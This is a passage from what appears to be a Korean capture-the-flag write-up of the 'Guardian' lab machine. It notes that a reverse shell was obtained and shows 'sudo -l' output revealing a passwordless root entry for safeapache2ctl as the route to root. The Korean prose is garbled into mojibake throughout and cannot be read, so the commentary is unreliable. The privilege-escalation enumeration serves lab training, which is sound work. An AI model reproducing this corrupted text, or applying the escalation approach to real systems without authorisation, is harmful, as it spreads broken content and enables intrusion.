ê·¸ ê²°ê³¼, ë¦¬ë²„ìŠ¤ ì…¸ì„ ì •ìƒì ìœ¼ë¡œ íšë“í•˜ì˜€ë‹¤.

![Talkative](/assets/htb-linux/guardian/mark-shell.png)

## mark â†’ root Lateral Movement

### Enumerating sudo Privileges

`sudo -l` ëª…ë ¹ì–´ë¥¼ í†µí•´ `mark` ì‚¬ìš©ìê°€ ìˆ˜í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ í™•ì¸í•œ ê²°ê³¼, ë‹¤ìŒê³¼ ê°™ì´ ì¶œë ¥ë˜ì—ˆë‹¤:

```bash
mark@guardian:/opt/scripts/utilities/utils$ sudo -l 

Matching Defaults entries for mark on guardian:                                                                                                                                                                                             
    env_reset, mail_badpass,                                                                                                                                                                                                                
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,                                                                                                                                               
    use_pty                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
User mark may run the following commands on guardian:                                                                                                                                                                                       
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl 
```